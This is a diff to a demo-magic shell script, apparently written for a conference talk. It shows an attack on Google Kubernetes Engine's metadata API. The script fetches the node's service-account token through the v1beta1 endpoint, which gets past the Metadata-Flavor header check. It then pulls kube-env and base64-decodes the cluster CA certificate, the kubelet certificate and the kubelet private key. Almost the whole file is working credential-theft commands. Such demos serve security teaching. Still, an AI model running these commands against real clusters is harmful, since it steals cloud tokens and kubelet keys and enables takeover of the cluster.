@@ -3,32 +3,42 @@
 set -e
 
 . demo-magic.sh
+RED="\033[0;91m"
 clear
+echo ""
+echo ""
 
-p "# Try to get the token from the metadata API"
-pe "wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
+p "${CYAN}# Try to get the token from the metadata API"
+p "${RED}wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token${COLOR_RESET}"
+wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token || true
 echo ""
 echo ""
 echo ""
-p "# Failed since we didn't set 'Metadata-Flavor: Google' header, but...."
-pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
+p "${CYAN}# Failed since we didn't set 'Metadata-Flavor: Google' header, but...."
+p "${RED}wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token${COLOR_RESET}"
+wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
 echo ""
-p "# Back to slides"
+echo ""
+echo ""
+p "${CYAN}# Back to slides"
 clear
-p "# Grab kube-env"
-pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"
+echo ""
+echo ""
+p "${CYAN}# Grab kube-env"
+p "${RED}wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json${COLOR_RESET}"
+wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
 echo ""
 echo ""
 echo ""
 p ""
 clear
-p "CA_CERT"
+p "${CYAN}CA_CERT${COLOR_RESET}"
 wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep CA_CERT | sed s'/CA_CERT: //g' | base64 -d
 echo ""
 echo ""
-p "KUBELET_CERT"
+p "${CYAN}KUBELET_CERT${COLOR_RESET}"
 wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_CERT | sed s'/KUBELET_CERT: //g' | base64 -d
 echo ""
 echo ""
-p "KUBELET_KEY"
+p "${CYAN}KUBELET_KEY${COLOR_RESET}"
 wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_KEY | sed s'/KUBELET_KEY: //g' | base64 -d
